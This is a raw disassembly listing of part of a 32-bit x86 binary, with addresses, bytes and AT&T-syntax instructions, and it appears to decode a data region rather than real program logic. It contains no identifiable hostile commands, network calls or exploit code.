  406aff:	01 21                	add    %esp,(%ecx)
  406b01:	03 18                	add    (%eax),%ebx
  406b03:	07                   	pop    %es
  406b04:	c7 00 c9 00 8f 1b    	movl   $0x1b8f00c9,(%eax)
  406b0a:	06                   	push   %es
  406b0b:	00 d1                	add    %dl,%cl
  406b0d:	00 0d 08 c7 00 a1    	add    %cl,0xa100c708
  406b13:	00 e2                	add    %ah,%dl
  406b15:	0d 6e 01 29 03       	or     $0x329016e,%eax
  406b1a:	74 0b                	je     0x406b27
  406b1c:	06                   	push   %es
  406b1d:	00 49 02             	add    %cl,0x2(%ecx)
  406b20:	f8                   	clc
  406b21:	08 dd                	or     %bl,%ch
  406b23:	01 a1 00 fc 07 10    	add    %esp,0x1007fc00(%ecx)
  406b29:	00 39                	add    %bh,(%ecx)
  406b2b:	03 6f 06             	add    0x6(%edi),%ebp
  406b2e:	e4 01                	in     $0x1,%al
  406b30:	39 03                	cmp    %eax,(%ebx)
  406b32:	74 0e                	je     0x406b42
  406b34:	e4 01                	in     $0x1,%al
  406b36:	c9                   	leave
  406b37:	00 38                	add    %bh,(%eax)
  406b39:	17                   	pop    %ss
  406b3a:	f4                   	hlt
  406b3b:	01 c9                	add    %ecx,%ecx
  406b3d:	00 94 09 c7 00 b9 02 	add    %dl,0x2b900c7(%ecx,%ecx,1)
  406b44:	0c 15                	or     $0x15,%al
  406b46:	c7 00 0c 00 bf 15    	movl   $0x15bf000c,(%eax)
  406b4c:	d2 00                	rolb   %cl,(%eax)
  406b4e:	49                   	dec    %ecx
  406b4f:	03 2d 1e 02 02 f1    	add    0xf102021e,%ebp
  406b55:	00 bf 15 10 00 f1    	add    %bh,-0xeffefeb(%edi)
  406b5b:	00 2e                	add    %ch,(%esi)
  406b5d:	1b 34 02             	sbb    (%edx,%eax,1),%esi
  406b60:	f9                   	stc
  406b61:	00 a1 15 39 02 01    	add    %ah,0x1023915(%ecx)
  406b67:	01 f1                	add    %esi,%ecx
  406b69:	1b 3f                	sbb    (%edi),%edi
  406b6b:	02 09                	add    (%ecx),%cl
  406b6d:	01 4a 11             	add    %ecx,0x11(%edx)
  406b70:	45                   	inc    %ebp
  406b71:	02 99 00 db 0e c7    	add    -0x38f12500(%ecx),%bl
  406b77:	00 01                	add    %al,(%ecx)
  406b79:	01 08                	add    %ecx,(%eax)
  406b7b:	1d 31 01 a1 00       	sbb    $0xa10131,%eax
  406b80:	f0 1d 32 00 a1 00    	lock sbb $0xa10032,%eax
  406b86:	d9 0d 45 02 59 03    	(bad) 0x3590245
  406b8c:	49                   	dec    %ecx
  406b8d:	1d 51 02 59 03       	sbb    $0x3590251,%eax
  406b92:	c1 13 06             	rcll   $0x6,(%ebx)
  406b95:	00 59 03             	add    %bl,0x3(%ecx)
  406b98:	0b 16                	or     (%esi),%edx
  406b9a:	57                   	push   %edi
  406b9b:	02 11                	add    (%ecx),%dl
  406b9d:	01 23                	add    %esp,(%ebx)
  406b9f:	16                   	push   %ss
  406ba0:	69 02 11 01 3b 1a    	imul   $0x1a3b0111,(%edx),%eax
  406ba6:	70 02                	jo     0x406baa
  406ba8:	49                   	dec    %ecx
  406ba9:	03 21                	add    (%ecx),%esp
  406bab:	08 76 02             	or     %dh,0x2(%esi)
  406bae:	14 00                	adc    $0x0,%al
  406bb0:	bf 15 d2 00 49       	mov    $0x4900d215,%edi
  406bb5:	03 ea                	add    %edx,%ebp
  406bb7:	1a 89 02 b9 02 f5    	sbb    -0xafd46fe(%ecx),%cl
  406bbd:	11 a9 02 b9 02 40    	adc    %ebp,0x4002b902(%ecx)
  406bc3:	18 bf 02 d1 02 50    	sbb    %bh,0x5002d102(%edi)
  406bc9:	03 cf                	add    %edi,%ecx
  406bcb:	02 99 02 d2 09 eb    	add    -0x14f62dfe(%ecx),%bl
  406bd1:	02 b9 02 a7 1a f0    	add    -0xfe558fe(%ecx),%bh
  406bd7:	02 99 02 8b 0f 4a    	add    0x4a0f8b02(%ecx),%bl
  406bdd:	01 19                	add    %ebx,(%ecx)
  406bdf:	01 08                	add    %ecx,(%eax)
  406be1:	07                   	pop    %es
  406be2:	f6 02 19             	testb  $0x19,(%edx)
  406be5:	01 db                	add    %ebx,%ebx
  406be7:	0e                   	push   %cs
  406be8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406be9:	01 81 02 1d 1d fc    	add    %eax,-0x3e2e2fe(%ecx)
  406bef:	02 d9                	add    %cl,%bl
  406bf1:	01 7c 0b 08          	add    %edi,0x8(%ebx,%ecx,1)
  406bf5:	03 d9                	add    %ecx,%ebx
  406bf7:	01 21                	add    %esp,(%ecx)
  406bf9:	1c 0e                	sbb    $0xe,%al
  406bfb:	03 d9                	add    %ecx,%ebx
  406bfd:	01 06                	add    %eax,(%esi)
  406bff:	10 1c 03             	adc    %bl,(%ebx,%eax,1)
  406c02:	41                   	inc    %ecx
  406c03:	01 bf 15 2b 03 41    	add    %edi,0x41032b15(%edi)
  406c09:	01 bf 1c 01 00 41    	add    %edi,0x4100011c(%edi)
  406c0f:	01 af 1c 01 00 41    	add    %ebp,0x4100011c(%edi)
  406c15:	01 f1                	add    %esi,%ecx
  406c17:	1a 38                	sbb    (%eax),%bh
  406c19:	03 41 01             	add    0x1(%ecx),%eax
  406c1c:	39 07                	cmp    %eax,(%edi)
  406c1e:	3e 03 41 01          	add    %ds:0x1(%ecx),%eax
  406c22:	eb 0d                	jmp    0x406c31
  406c24:	3e 03 41 01          	add    %ds:0x1(%ecx),%eax
  406c28:	6e                   	outsb  %ds:(%esi),(%dx)
  406c29:	0b 06                	or     (%esi),%eax
  406c2b:	00 79 01             	add    %bh,0x1(%ecx)
  406c2e:	2d 1e 58 03 51       	sub    $0x5103581e,%eax
  406c33:	01 bf 15 5d 03 51    	add    %edi,0x51035d15(%edi)
  406c39:	01 21                	add    %esp,(%ecx)
  406c3b:	1c 06                	sbb    $0x6,%al
  406c3d:	00 51 01             	add    %dl,0x1(%ecx)
  406c40:	63 0e                	arpl   %ecx,(%esi)
  406c42:	31 01                	xor    %eax,(%ecx)
  406c44:	51                   	push   %ecx
  406c45:	01 c3                	add    %eax,%ebx
  406c47:	1b 65 03             	sbb    0x3(%ebp),%esp
  406c4a:	59                   	pop    %ecx
  406c4b:	01 27                	add    %esp,(%edi)
  406c4d:	11 6b 03             	adc    %ebp,0x3(%ebx)
  406c50:	69 01 bf 15 71 03    	imul   $0x37115bf,(%ecx),%eax
  406c56:	71 01                	jno    0x406c59
  406c58:	bf 15 71 03 71       	mov    $0x71037115,%edi
  406c5d:	01 12                	add    %edx,(%edx)
  406c5f:	0f 15 00             	unpckhps (%eax),%xmm0
  406c62:	21 03                	and    %eax,(%ebx)
  406c64:	5f                   	pop    %edi
  406c65:	0a c7                	or     %bh,%al
  406c67:	00 b9 02 a0 07 68    	add    %bh,0x6807a002(%ecx)
  406c6d:	00 89 03 68 0a 10    	add    %cl,0x100a6803(%ecx)
  406c73:	00 49 01             	add    %cl,0x1(%ecx)
  406c76:	c3                   	ret
  406c77:	06                   	push   %es
  406c78:	31 01                	xor    %eax,(%ecx)
  406c7a:	51                   	push   %ecx
  406c7b:	01 c1                	add    %eax,%ecx
  406c7d:	13 06                	adc    (%esi),%eax
  406c7f:	00 49 02             	add    %cl,0x2(%ecx)
  406c82:	bf 15 85 03 49       	mov    $0x49038515,%edi
  406c87:	02 5d 15             	add    0x15(%ebp),%bl
  406c8a:	15 00 c9 00 4b       	adc    $0x4b00c900,%eax
  406c8f:	15 d0 01 91 03       	adc    $0x39101d0,%eax
  406c94:	b6 09                	mov    $0x9,%dh
  406c96:	4a                   	dec    %edx
  406c97:	01 91 03 94 1e 99    	add    %edx,-0x66e16bfd(%ecx)
  406c9d:	03 99 03 63 1c a0    	add    -0x5fe39cfd(%ecx),%ebx
  406ca3:	03 79 01             	add    0x1(%ecx),%edi
  406ca6:	07                   	pop    %es
  406ca7:	1e                   	push   %ds
  406ca8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406ca9:	03 b9 02 89 1b ad    	add    -0x52e476fe(%ecx),%edi
  406caf:	03 81 01 bf 15 06    	add    0x615bf01(%ecx),%eax
  406cb5:	00 81 01 39 07 be    	add    %al,-0x41f8c6ff(%ecx)
  406cbb:	03 89 01 9c 1a c6    	add    -0x39e563ff(%ecx),%ecx
  406cc1:	03 59 01             	add    0x1(%ecx),%ebx
  406cc4:	bf 15 06 00 59       	mov    $0x59000615,%edi
  406cc9:	01 94 05 d3 03 39 01 	add    %edx,0x13903d3(%ebp,%eax,1)
  406cd0:	78 1b                	js     0x406ced
  406cd2:	db 03                	fildl  (%ebx)
  406cd4:	59                   	pop    %ecx
  406cd5:	01 7e 06             	add    %edi,0x6(%esi)
  406cd8:	31 01                	xor    %eax,(%ecx)
  406cda:	81 02 1b 0a e9 03    	addl   $0x3e90a1b,(%edx)
  406ce0:	b1 00                	mov    $0x0,%cl
  406ce2:	4c                   	dec    %esp
  406ce3:	12 ef                	adc    %bh,%ch
  406ce5:	03 91 01 5b 19 f9    	add    -0x6e6a4ff(%ecx),%edx
  406ceb:	03 21                	add    (%ecx),%esp
  406ced:	01 a9 10 06 00 21    	add    %ebp,0x21000610(%ecx)
  406cf3:	01 bf 15 06 00 a9    	add    %edi,-0x56fff9eb(%edi)
  406cf9:	00 0c 1d 10 04 b9 02 	add    %cl,0x2b90410(,%ebx,1)
  406d00:	cd 18                	int    $0x18
  406d02:	15 04 b9 02 bf       	adc    $0xbf02b904,%eax
  406d07:	15 1a 04 81 02       	adc    $0x281041a,%eax
  406d0c:	31 1e                	xor    %ebx,(%esi)
  406d0e:	fc                   	cld
  406d0f:	02 81 02 67 17 23    	add    0x23176702(%ecx),%al
  406d15:	04 a1                	add    $0xa1,%al
  406d17:	02 ff                	add    %bh,%bh
  406d19:	16                   	push   %ss
  406d1a:	40                   	inc    %eax
  406d1b:	04 b9                	add    $0xb9,%al
  406d1d:	02 1f                	add    (%edi),%bl
  406d1f:	18 47 04             	sbb    %al,0x4(%edi)
  406d22:	c1 03 fd             	roll   $0xfd,(%ebx)
  406d25:	1b 4f 04             	sbb    0x4(%edi),%ecx
  406d28:	c9                   	leave
  406d29:	03 bf 15 55 04 c9    	add    -0x36fbaaeb(%edi),%edi
  406d2f:	03 af 08 5c 04 f9    	add    -0x6fba3f8(%edi),%ebp
  406d35:	01 bf 15 10 00 f9    	add    %edi,-0x6ffefeb(%edi)
  406d3b:	01 db                	add    %ebx,%ebx
  406d3d:	0f 57 02             	xorps  (%edx),%xmm0
  406d40:	89 02                	mov    %eax,(%edx)
  406d42:	96                   	xchg   %eax,%esi
  406d43:	1b ef                	sbb    %edi,%ebp
  406d45:	00 81 02 31 1e 7a    	add    %al,0x7a1e3102(%ecx)
  406d4b:	04 99                	add    $0x99,%al
  406d4d:	02 7f 0f             	add    0xf(%edi),%bh
  406d50:	eb 02                	jmp    0x406d54
  406d52:	b9 02 10 07 81       	mov    $0x81071002,%ecx
  406d57:	04 b9                	add    $0xb9,%al
  406d59:	02 1f                	add    (%edi),%bl
  406d5b:	18 87 04 1c 00 bf    	sbb    %al,-0x40ffe3fc(%edi)
  406d61:	15 d2 00 21 01       	adc    $0x12100d2,%eax
  406d66:	9b                   	fwait
  406d67:	11 99 04 39 01 40    	adc    %ebx,0x40013904(%ecx)
  406d6d:	13 9f 04 d9 03 1f    	adc    0x1f03d904(%edi),%ebx
  406d73:	15 bc 04 d9 03       	adc    $0x3d904bc,%eax
  406d78:	68 0a b7 00 d9       	push   $0xd900b70a
  406d7d:	03 40 15             	add    0x15(%eax),%eax
  406d80:	c3                   	ret
  406d81:	04 e9                	add    $0xe9,%al
  406d83:	03 06                	add    (%esi),%eax
  406d85:	15 dc 04 e9 03       	adc    $0x3e904dc,%eax
  406d8a:	96                   	xchg   %eax,%esi
  406d8b:	1b e3                	sbb    %ebx,%esp
  406d8d:	04 29                	add    $0x29,%al
  406d8f:	02 9c 17 f7 04 29 02 	add    0x22904f7(%edi,%edx,1),%bl
  406d96:	d7                   	xlat   %ds:(%ebx)
  406d97:	1d 31 01 29 02       	sbb    $0x2290131,%eax
  406d9c:	d6                   	salc
  406d9d:	0a fe                	or     %dh,%bh
  406d9f:	04 29                	add    $0x29,%al
  406da1:	02 76 1e             	add    0x1e(%esi),%dh
  406da4:	04 05                	add    $0x5,%al
  406da6:	01 04 87             	add    %eax,(%edi,%eax,4)
  406da9:	09 c7                	or     %eax,%edi
  406dab:	00 b9 02 ed 0f 47    	add    %bh,0x470fed02(%ecx)
  406db1:	04 a1                	add    $0xa1,%al
  406db3:	01 bf 15 06 00 a1    	add    %edi,-0x5efff9eb(%edi)
  406db9:	01 e3                	add    %esp,%ebx
  406dbb:	09 10                	or     %edx,(%eax)
  406dbd:	00 a1 01 7a 07 10    	add    %ah,0x10077a01(%ecx)
  406dc3:	00 a1 01 2b 12 21    	add    %ah,0x21122b01(%ecx)
  406dc9:	05 a1 01 db 16       	add    $0x16db01a1,%eax
  406dce:	15 00 a1 01 fa       	adc    $0xfa01a100,%eax
  406dd3:	11 28                	adc    %ebp,(%eax)
  406dd5:	05 91 01 ef 15       	add    $0x15ef0191,%eax
  406dda:	2f                   	das
  406ddb:	05 19 04 a3 1c       	add    $0x1ca30419,%eax
  406de0:	36 05 a9 01 bf 15    	ss add $0x15bf01a9,%eax
  406de6:	3d 05 a9 01 8c       	cmp    $0x8c01a905,%eax
  406deb:	06                   	push   %es
  406dec:	31 01                	xor    %eax,(%ecx)
  406dee:	d9 00                	flds   (%eax)
  406df0:	35 19 45 05 d9       	xor    $0xd9054519,%eax
  406df5:	00 65 07             	add    %ah,0x7(%ebp)
  406df8:	4c                   	dec    %esp
  406df9:	05 99 01 bf 15       	add    $0x15bf0199,%eax
  406dfe:	d2 00                	rolb   %cl,(%eax)
  406e00:	39 01                	cmp    %eax,(%ecx)
  406e02:	40                   	inc    %eax
  406e03:	13 6f 05             	adc    0x5(%edi),%ebp
  406e06:	39 01                	cmp    %eax,(%ecx)
  406e08:	e3 14                	jecxz  0x406e1e
  406e0a:	78 05                	js     0x406e11
  406e0c:	d1 01                	roll   $1,(%ecx)
  406e0e:	b3 06                	mov    $0x6,%bl
  406e10:	31 01                	xor    %eax,(%ecx)
  406e12:	d9 01                	flds   (%ecx)
  406e14:	9c                   	pushf
  406e15:	06                   	push   %es
  406e16:	7e 05                	jle    0x406e1d
  406e18:	d1 01                	roll   $1,(%ecx)
  406e1a:	9b                   	fwait
  406e1b:	1b 06                	sbb    (%esi),%eax
  406e1d:	00 b9 01 bf 15 01    	add    %bh,0x115bf01(%ecx)
  406e23:	00 24 00             	add    %ah,(%eax,%eax,1)
  406e26:	bf 15 06 00 b9       	mov    $0xb9000615,%edi
  406e2b:	02 ae 1a 9b 05 b9    	add    -0x46fa64e6(%esi),%ch
  406e31:	01 a1 05 1c 03 39    	add    %esp,0x39031c05(%ecx)
  406e37:	01 40 13             	add    %eax,0x13(%eax)
  406e3a:	a2 05 24 00 42       	mov    %al,0x42002405
  406e3f:	06                   	push   %es
  406e40:	b0 05                	mov    $0x5,%al
  406e42:	39 01                	cmp    %eax,(%ecx)
  406e44:	dd 10                	fstl   (%eax)
  406e46:	b6 05                	mov    $0x5,%dh
  406e48:	d9 01                	flds   (%ecx)
  406e4a:	04 13                	add    $0x13,%al
  406e4c:	c4 05 d9 01 a5 1b    	les    0x1ba501d9,%eax
  406e52:	06                   	push   %es
  406e53:	00 d9                	add    %bl,%cl
  406e55:	01 8d 0a 27 00 39    	add    %ecx,0x3900270a(%ebp)
  406e5b:	01 ac 1d 02 06 39 01 	add    %ebp,0x1390602(%ebp,%ebx,1)
  406e62:	29 1e                	sub    %ebx,(%esi)
  406e64:	09 06                	or     %eax,(%esi)
  406e66:	2c 00                	sub    $0x0,%al
  406e68:	e3 14                	jecxz  0x406e7e
  406e6a:	21 06                	and    %eax,(%esi)
  406e6c:	34 00                	xor    $0x0,%al
  406e6e:	b3 06                	mov    $0x6,%bl
  406e70:	31 01                	xor    %eax,(%ecx)
  406e72:	34 00                	xor    $0x0,%al
  406e74:	9b                   	fwait
  406e75:	1b 42 06             	sbb    0x6(%edx),%eax
  406e78:	59                   	pop    %ecx
  406e79:	01 6e 0b             	add    %ebp,0xb(%esi)
  406e7c:	06                   	push   %es
  406e7d:	00 59 01             	add    %bl,0x1(%ecx)
  406e80:	74 0b                	je     0x406e8d
  406e82:	06                   	push   %es
  406e83:	00 81 02 2b 0a 7a    	add    %al,0x7a0a2b02(%ecx)
  406e89:	06                   	push   %es
  406e8a:	81 02 f9 09 e9 03    	addl   $0x3e909f9,(%edx)
  406e90:	81 02 0a 0a 7a 06    	addl   $0x67a0a0a,(%edx)
  406e96:	81 02 3b 0a e9 03    	addl   $0x3e90a3b,(%edx)
  406e9c:	81 02 4d 0a 7a 06    	addl   $0x67a0a4d,(%edx)
  406ea2:	b9 01 44 0b 11       	mov    $0x110b4401,%ecx
  406ea7:	01 31                	add    %esi,(%ecx)
  406ea9:	04 3c                	add    $0x3c,%al
  406eab:	0b 8a 06 31 04 78    	or     0x78043106(%edx),%ecx
  406eb1:	1d 06 00 39 01       	sbb    $0x1390006,%eax
  406eb6:	ac                   	lods   %ds:(%esi),%al
  406eb7:	1d a3 06 b1 00       	sbb    $0xb106a3,%eax
  406ebc:	5a                   	pop    %edx
  406ebd:	1d f4 00 39 01       	sbb    $0x13900f4,%eax
  406ec2:	dd 10                	fstl   (%eax)
  406ec4:	b6 06                	mov    $0x6,%dh
  406ec6:	21 01                	and    %eax,(%ecx)
  406ec8:	c3                   	ret
  406ec9:	06                   	push   %es
  406eca:	31 01                	xor    %eax,(%ecx)
  406ecc:	09 00                	or     %eax,(%eax)
  406ece:	0c 00                	or     $0x0,%al
  406ed0:	e7 06                	out    %eax,$0x6
  406ed2:	09 00                	or     %eax,(%eax)
  406ed4:	10 00                	adc    %al,(%eax)
  406ed6:	ec                   	in     (%dx),%al
  406ed7:	06                   	push   %es
  406ed8:	09 00                	or     %eax,(%eax)
  406eda:	14 00                	adc    $0x0,%al
  406edc:	f1                   	int1
  406edd:	06                   	push   %es
  406ede:	09 00                	or     %eax,(%eax)
  406ee0:	18 00                	sbb    %al,(%eax)
  406ee2:	f6 06 09             	testb  $0x9,(%esi)
  406ee5:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406ee8:	fb                   	sti
  406ee9:	06                   	push   %es
  406eea:	08 00                	or     %al,(%eax)
  406eec:	44                   	inc    %esp
  406eed:	00 00                	add    %al,(%eax)
  406eef:	07                   	pop    %es
  406ef0:	08 00                	or     %al,(%eax)
  406ef2:	48                   	dec    %eax
  406ef3:	00 05 07 27 00 83    	add    %al,0x83002707
  406ef9:	00 48 0a             	add    %cl,0xa(%eax)
  406efc:	2e 00 0b             	add    %cl,%cs:(%ebx)
  406eff:	00 bd 08 2e 00 13    	add    %bh,0x13002e08(%ebp)
  406f05:	00 c6                	add    %al,%dh
  406f07:	08 2e                	or     %ch,(%esi)
  406f09:	00 1b                	add    %bl,(%ebx)
  406f0b:	00 e5                	add    %ah,%ch
  406f0d:	08 2e                	or     %ch,(%esi)
  406f0f:	00 23                	add    %ah,(%ebx)
  406f11:	00 ee                	add    %ch,%dh
  406f13:	08 2e                	or     %ch,(%esi)
  406f15:	00 2b                	add    %ch,(%ebx)
  406f17:	00 ee                	add    %ch,%dh
  406f19:	08 2e                	or     %ch,(%esi)
  406f1b:	00 33                	add    %dh,(%ebx)
  406f1d:	00 00                	add    %al,(%eax)
  406f1f:	09 2e                	or     %ebp,(%esi)
  406f21:	00 3b                	add    %bh,(%ebx)
  406f23:	00 06                	add    %al,(%esi)
  406f25:	09 2e                	or     %ebp,(%esi)
  406f27:	00 43 00             	add    %al,0x0(%ebx)
  406f2a:	ee                   	out    %al,(%dx)
  406f2b:	08 2e                	or     %ch,(%esi)
  406f2d:	00 4b 00             	add    %cl,0x0(%ebx)
  406f30:	12 09                	adc    (%ecx),%cl
  406f32:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  406f36:	00 09                	add    %cl,(%ecx)
  406f38:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  406f3c:	00 09                	add    %cl,(%ecx)
  406f3e:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406f42:	33 09                	xor    (%ecx),%ecx
  406f44:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  406f48:	5d                   	pop    %ebp
  406f49:	09 2e                	or     %ebp,(%esi)
  406f4b:	00 73 00             	add    %dh,0x0(%ebx)
  406f4e:	6a 09                	push   $0x9
  406f50:	03 03                	add    (%ebx),%eax
  406f52:	8b 00                	mov    (%eax),%eax
  406f54:	48                   	dec    %eax
  406f55:	0a 23                	or     (%ebx),%ah
  406f57:	03 8b 00 48 0a 43    	add    0x430a4800(%ebx),%ecx
  406f5d:	03 8b 00 48 0a 63    	add    0x630a4800(%ebx),%ecx
  406f63:	03 8b 00 48 0a 83    	add    -0x7cf5b800(%ebx),%ecx
  406f69:	03 8b 00 48 0a a3    	add    -0x5cf5b800(%ebx),%ecx
  406f6f:	03 8b 00 48 0a c3    	add    -0x3cf5b800(%ebx),%ecx
  406f75:	03 8b 00 48 0a e3    	add    -0x1cf5b800(%ebx),%ecx
  406f7b:	03 8b 00 48 0a 03    	add    0x30a4800(%ebx),%ecx
  406f81:	04 8b                	add    $0x8b,%al
  406f83:	00 48 0a             	add    %cl,0xa(%eax)
  406f86:	23 04 8b             	and    (%ebx,%ecx,4),%eax
  406f89:	00 48 0a             	add    %cl,0xa(%eax)
  406f8c:	43                   	inc    %ebx
  406f8d:	04 8b                	add    $0x8b,%al
  406f8f:	00 48 0a             	add    %cl,0xa(%eax)
  406f92:	63 04 8b             	arpl   %eax,(%ebx,%ecx,4)
  406f95:	00 48 0a             	add    %cl,0xa(%eax)
  406f98:	83 04 8b 00          	addl   $0x0,(%ebx,%ecx,4)
  406f9c:	48                   	dec    %eax
  406f9d:	0a a3 04 8b 00 48    	or     0x48008b04(%ebx),%ah
  406fa3:	0a c3                	or     %bl,%al
  406fa5:	04 8b                	add    $0x8b,%al
  406fa7:	00 48 0a             	add    %cl,0xa(%eax)
  406faa:	e3 04                	jecxz  0x406fb0
  406fac:	8b 00                	mov    (%eax),%eax
  406fae:	48                   	dec    %eax
  406faf:	0a 03                	or     (%ebx),%al
  406fb1:	05 8b 00 48 0a       	add    $0xa48008b,%eax
  406fb6:	23 05 8b 00 48 0a    	and    0xa48008b,%eax
  406fbc:	43                   	inc    %ebx
  406fbd:	05 8b 00 48 0a       	add    $0xa48008b,%eax
  406fc2:	e0 06                	loopne 0x406fca
  406fc4:	93                   	xchg   %eax,%ebx
  406fc5:	00 b8 09 e0 07 93    	add    %bh,-0x6cf81ff7(%eax)
  406fcb:	00 e4                	add    %ah,%ah
  406fcd:	09 40 09             	or     %eax,0x9(%eax)
  406fd0:	93                   	xchg   %eax,%ebx
  406fd1:	00 25 0a 40 09 b3    	add    %ah,0xb309400a
  406fd7:	00 48 0a             	add    %cl,0xa(%eax)
  406fda:	20 0a                	and    %cl,(%edx)
  406fdc:	93                   	xchg   %eax,%ebx
  406fdd:	00 4d 0a             	add    %cl,0xa(%ebp)
  406fe0:	c0 0a 93             	rorb   $0x93,(%edx)
  406fe3:	00 82 0a e0 0d 93    	add    %al,-0x6cf21ff6(%edx)
  406fe9:	00 b2 0a 20 0e ab    	add    %dh,-0x54f1dff6(%edx)
  406fef:	00 48 0a             	add    %cl,0xa(%eax)
  406ff2:	60                   	pusha
  406ff3:	0e                   	push   %cs
  406ff4:	ab                   	stos   %eax,%es:(%edi)
  406ff5:	00 48 0a             	add    %cl,0xa(%eax)
  406ff8:	00 0f                	add    %cl,(%edi)
  406ffa:	ab                   	stos   %eax,%es:(%edi)
  406ffb:	00 48 0a             	add    %cl,0xa(%eax)
  406ffe:	60                   	pusha
  406fff:	0f 93 00             	setae  (%eax)
  407002:	f6 0a a0             	testb  $0xa0,(%edx)
  407005:	0f ab 00             	bts    %eax,(%eax)
  407008:	48                   	dec    %eax
  407009:	0a 00                	or     (%eax),%al
  40700b:	10 93 00 22 0b 80    	adc    %dl,-0x7ff4de00(%ebx)
  407011:	10 ab 00 48 0a c0    	adc    %ch,-0x3ff5b800(%ebx)
  407017:	10 ab 00 48 0a 00    	adc    %ch,0xa4800(%ebx)
  40701d:	11 ab 00 48 0a 40    	adc    %ebp,0x400a4800(%ebx)
  407023:	11 ab 00 48 0a 08    	adc    %ebp,0x80a4800(%ebx)
  407029:	00 06                	add    %al,(%esi)
  40702b:	00 0a                	add    %cl,(%edx)
  40702d:	07                   	pop    %es
  40702e:	01 00                	add    %eax,(%eax)
  407030:	03 00                	add    (%eax),%eax
  407032:	00 00                	add    %al,(%eax)
  407034:	2b 00                	sub    (%eax),%eax
  407036:	01 00                	add    %eax,(%eax)
  407038:	7a 00                	jp     0x40703a
  40703a:	00 00                	add    %al,(%eax)
  40703c:	2c 00                	sub    $0x0,%al
  40703e:	49                   	dec    %ecx
  40703f:	00 6d 00             	add    %ch,0x0(%ebp)
  407042:	de 00                	fiadds (%eax)
  407044:	0b 01                	or     (%ecx),%eax
  407046:	21 01                	and    %eax,(%ecx)
  407048:	3e 01 43 01          	add    %eax,%ds:0x1(%ebx)
  40704c:	54                   	push   %esp
  40704d:	01 7a 01             	add    %edi,0x1(%edx)
  407050:	84 01                	test   %al,(%ecx)
  407052:	c3                   	ret
  407053:	01 d6                	add    %edx,%esi
  407055:	01 e8                	add    %ebp,%eax
  407057:	01 1a                	add    %ebx,(%edx)
  407059:	02 26                	add    (%esi),%ah
  40705b:	02 4a 02             	add    0x2(%edx),%cl
  40705e:	5b                   	pop    %ebx
  40705f:	02 b4 02 c4 02 d4 02 	add    0x2d402c4(%edx,%eax,1),%dh
  407066:	de 02                	fiadds (%edx)
  407068:	e2 02                	loop   0x40706c
  40706a:	02 03                	add    (%ebx),%al
  40706c:	22 03                	and    (%ebx),%al
  40706e:	44                   	inc    %esp
  40706f:	03 7b 03             	add    0x3(%ebx),%edi
  407072:	8b 03                	mov    (%ebx),%eax
  407074:	b4 03                	mov    $0x3,%ah
  407076:	cc                   	int3
  407077:	03 e0                	add    %eax,%esp
  407079:	03 fd                	add    %ebp,%edi
  40707b:	03 09                	add    (%ecx),%ecx
  40707d:	04 20                	add    $0x20,%al
  40707f:	04 2b                	add    $0x2b,%al
  407081:	04 30                	add    $0x30,%al
  407083:	04 35                	add    $0x35,%al
  407085:	04 63                	add    $0x63,%al
  407087:	04 6f                	add    $0x6f,%al
  407089:	04 b0                	add    $0xb0,%al
  40708b:	04 c7                	add    $0xc7,%al
  40708d:	04 d3                	add    $0xd3,%al
  40708f:	04 e8                	add    $0xe8,%al
  407091:	04 0a                	add    $0xa,%al
  407093:	05 12 05 59 05       	add    $0x5590512,%eax
  407098:	65 05 ca 05 e5 05    	gs add $0x5e505ca,%eax
  40709e:	f1                   	int1
  40709f:	05 47 06 53 06       	add    $0x6530647,%eax
  4070a4:	6a 06                	push   $0x6
  4070a6:	92                   	xchg   %eax,%edx
  4070a7:	06                   	push   %es
  4070a8:	c0 06 22             	rolb   $0x22,(%esi)
  4070ab:	00 e0                	add    %ah,%al
  4070ad:	00 27                	add    %ah,(%edi)
  4070af:	00 22                	add    %ah,(%edx)
  4070b1:	00 e2                	add    %ah,%dl
  4070b3:	00 29                	add    %ch,(%ecx)
  4070b5:	00 23                	add    %ah,(%ebx)
  4070b7:	00 e4                	add    %ah,%ah
  4070b9:	00 27                	add    %ah,(%edi)
  4070bb:	00 23                	add    %ah,(%ebx)
  4070bd:	00 e6                	add    %ah,%dh
  4070bf:	00 29                	add    %ch,(%ecx)
  4070c1:	00 25 00 ee 00 27    	add    %ah,0x2700ee00
  4070c7:	00 25 00 f0 00 29    	add    %ah,0x2900f000
  4070cd:	00 27                	add    %ah,(%edi)
  4070cf:	00 f8                	add    %bh,%al
  4070d1:	00 27                	add    %ah,(%edi)
  4070d3:	00 27                	add    %ah,(%edi)
  4070d5:	00 fa                	add    %bh,%dl
  4070d7:	00 29                	add    %ch,(%ecx)
  4070d9:	00 2a                	add    %ch,(%edx)
  4070db:	00 06                	add    %al,(%esi)
  4070dd:	01 27                	add    %esp,(%edi)
  4070df:	00 2a                	add    %ch,(%edx)
  4070e1:	00 08                	add    %cl,(%eax)
  4070e3:	01 29                	add    %ebp,(%ecx)
  4070e5:	00 2d 00 0a 01 27    	add    %ch,0x27010a00
  4070eb:	00 2d 00 0c 01 29    	add    %ch,0x29010c00
  4070f1:	00 2e                	add    %ch,(%esi)
  4070f3:	00 0e                	add    %cl,(%esi)
  4070f5:	01 27                	add    %esp,(%edi)
  4070f7:	00 2e                	add    %ch,(%esi)
  4070f9:	00 10                	add    %dl,(%eax)
  4070fb:	01 29                	add    %ebp,(%ecx)
  4070fd:	00 2f                	add    %ch,(%edi)
  4070ff:	00 12                	add    %dl,(%edx)
  407101:	01 27                	add    %esp,(%edi)
  407103:	00 2f                	add    %ch,(%edi)
  407105:	00 14 01             	add    %dl,(%ecx,%eax,1)
  407108:	29 00                	sub    %eax,(%eax)
  40710a:	9c                   	pushf
  40710b:	02 f2                	add    %dl,%dh
  40710d:	10 e5                	adc    %ah,%ch
  40710f:	10 fd                	adc    %bh,%ch
  407111:	10 fa                	adc    %bh,%dl
  407113:	01 81 02 90 04 92    	add    %eax,-0x6dfb6ffe(%ecx)
  407119:	05 18 06 2b 06       	add    $0x62b0618,%eax
  40711e:	00 01                	add    %al,(%ecx)
  407120:	05 00 1e 1a 01       	add    $0x11a1e00,%eax
  407125:	00 00                	add    %al,(%eax)
  407127:	01 07                	add    %eax,(%edi)
